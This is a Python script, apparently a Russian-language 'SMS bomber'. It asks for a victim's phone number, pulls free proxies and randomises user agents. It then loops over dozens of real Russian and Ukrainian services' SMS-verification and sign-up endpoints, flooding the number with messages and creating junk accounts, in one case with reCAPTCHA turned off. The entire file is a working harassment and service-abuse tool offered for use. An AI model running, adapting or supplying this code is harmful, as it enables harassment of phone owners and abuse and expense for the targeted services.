import requests, datetime, random
import os
import sys
from colorama import Fore
from bs4 import BeautifulSoup

headers_useragents = list ()

os.system ('clear')

def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)
	
def randomString(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def initHeaders():
	useragent_list()
	global headers_useragents
	headers = {
				'User-Agent': random.choice(headers_useragents),
				'Cache-Control': 'no-cache',
				'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
				'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5,10)),
				'Keep-Alive': str(random.randint(110,120)),
				'Connection': 'keep-alive'
				}

	return headers

def get_proxy (url):
	r = requests.get (url)

	soup = BeautifulSoup (r.text, 'lxml')
	line = soup.find ('table', id = 'theProxyList').find ('tbody').find_all ('tr')	

	file = open ('proxies.txt', 'w+')

	for tr in line:
		td = tr.find_all ('td')

		ip = td[1].text
		port = td[2].text

		file.write ('http://' + ip + ':' + port + '\n')



def sent (phoneNum, proxy, name, email):

	proxies = open (proxy, 'r').read().splitlines()
	prox = {}

	for p in proxies:
		headers = initHeaders()	
		prox['http'] = p

		while True:
			try:
				requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://alfalife.cc/auth.php", data={"phone": phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://app.benzuber.ru/login", data={"phone": "+" + phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone","variables": {"phone": phoneNum},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n",}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phoneNum + "/")
				print (Fore.GREEN + 'Успешно отправлено')

			except:
				print (Fore.RED + 'Не отправлено')
				break
			try:
				requests.post("https://city24.ua/personalaccount/account/registration",data={"PhoneNumber": phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')

			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://app.cloudloyalty.ru/demo/send-code",json={"country": 2,"phone": phoneNum,"roistatVisit": "47637","experiments": {"new_header_title": "1"},}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')

			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phoneNum, "SignupForm[device_type]": 3,}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')

			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')

			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://api.easypay.ua/api/auth/register",json={"phone": phoneNum, "password": name}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')

			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"phone": "+" + phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')

			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.get("https://findclone.ru/register", params={"phone": "+" + phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')

			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://fix-price.ru/ajax/registerphoneNum_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+" + phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')

			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": phoneNum}}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')

			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": phoneNum, "platform": "PISWeb"}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')

			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://icq.com/smscode/login/ru",data={"msisdn": phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')

			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request","phone": "+" +phoneNum,"phone_permission": "unknown","stream_id": 0,"v": 3,"appversion": "3.20.6","osversion": "unknown","devicemodel": "unknown",}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')

			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data={"password": name,"application": "lkp","login": "+" +phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')

			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')

			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')

			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')

			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+" + phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')

			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms",headers={"Agent": "website"},json={"Phone": phoneNum, "Type": 1}, proxies=prox)
				print (Fore.GREEN + 'Успешно отправлено')

			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": "+" + phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://cloud.mail.ru/api/v2/notify/applink",json={"phone": "+" + phoneNum,"api": 2,"email": "email","x-email": "x-email",}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",data={"phone": phoneNum, "do": "phone"}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": phoneNum,"user_info[email]": email,"user_info[password]": name,"user_info[conf_password]": name,}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://mobileplanet.ua/register",data={"klientname": name,"klientphoneNum": "+" + phoneNum,"klient_email": email}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')			
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+" + phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": phoneNum,"email": email}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://auth.multiplex.ua/login", json={"login": phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')			
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": phoneNum, "recaptcha": "off", "g-recaptcha-response": ""}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://account.my.games/signup_send_sms/", data={"phone": phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": phoneNum,"registration": "N"}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" +phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')		
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://www.ollis.ru/gql",json={"query": 'mutation { phone(number:"%s", locale:ru) { token error { code message } } }'% phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.get("https://secure.online.ua/ajax/checkphoneNum/", params={"regphoneNum": phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": phoneNum, "otpId": 0}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://plink.tech/resend_activation_token/?via=call",json={"phone": phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://plink.tech/register/", json={"phone": phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')			
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://app.redmondeda.ru/api/v1/app/sendverificationcode",headers={"token": "."},data={"phone": phoneNum}, proxies=prox)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://app.sberfood.ru/api/mobile/v3/auth/sendSms",json={"userPhone": "+" + phoneNum},headers={"AppKey": "WebApp-3a2605b0cf2a4c9d938752a84b7e97b6"}, proxies=prox)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+" +phoneNum, "resend": 0}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",params={"oper": 9, "callmode": 1, "phone": "+" +phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+" +phoneNum, "action": "confirm_mobile"}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.get("https://www.sportmaster.ua/",params={"module": "users", "action": "SendSMSReg", "phone": phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone":phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://msk.tele2.ru/api/validation/number/" +phoneNum,json={"sender": "Tele2"}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number":phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено. Переключаю прокси')
			try:
				requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+" +phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://passport.twitch.tv/register?trusted_request=true",json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp","include_verification_code": True,"password": name,"phone_number": phoneNum,"username": name}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://www.uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phoneNum}, proxies=prox)
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://pay.visa.ru/api/Auth/code/request",json={"phoneNumber": "+" +phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName": name,"firstName": name,"middleName": name,"mobilePhone":phoneNum,"email": email,"smsCode": ""}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn":phoneNum},headers={"App-ID": "cabinet"}, proxies=prox)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone":phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": phoneNum, "type": 2}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://www.yaposhka.kh.ua/customer/account/createpost/",data={"success_url": "","error_url": "","is_subscribed": "0","firstname":name,"lastname": name,"email": email,"password":name,"password_confirmation": name,"telephone": phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')
			try:
				requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phoneNum}, proxies=prox, headers = headers)
				print (Fore.GREEN + 'Успешно отправлено')
			except:
				print (Fore.RED + 'Не отправлено')

def main ():

	print (Fore.GREEN + '''
                                                                                                 
88888888ba,     ad88888ba                                                                        
88      `"8b   d8"     "8b                                                                       
88        `8b  Y8,                                                                               
88         88  `Y8aaaaa,    8b,dPPYba,   ,adPPYYba,  88,dPYba,,adPYba,    ,adPPYba,  8b,dPPYba,  
88         88    `"""""8b,  88P'    "8a  ""     `Y8  88P'   "88"    "8a  a8P_____88  88P'   "Y8  
88         8P          `8b  88       d8  ,adPPPPP88  88      88      88  8PP"""""""  88          
88      .a8P   Y8a     a8P  88b,   ,a8"  88,    ,88  88      88      88  "8b,   ,aa  88          
88888888Y"'     "Y88888P"   88`YbbdP"'   `"8bbdP"Y8  88      88      88   `"Ybbd8"'  88          
                            88                                                                   
                            88                                                                   
		''')

	phoneNum = input ('Введите номер телефона: ')

	if phoneNum[0] == '+':
		phoneNum = phoneNum[1:]
	if phoneNum[0] == '8':
		phoneNum = '7'+phoneNum[1:]
	if phoneNum[0] == '9':
		phoneNum = '7'+phoneNum

	proxy = input ('Введите название файла с прокси (или будут использоваться стандартные press Enter): ')

	if proxy.strip () == '':
		get_proxy ('http://foxtools.ru/Proxy?al=True&am=True&ah=True&ahs=True&http=True&https=False')
		proxy = 'proxies.txt'

	name = random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	email = name + '@gmail.com'

	sent (phoneNum, proxy, name, email)

if __name__ == '__main__':
	clear ()
	main ()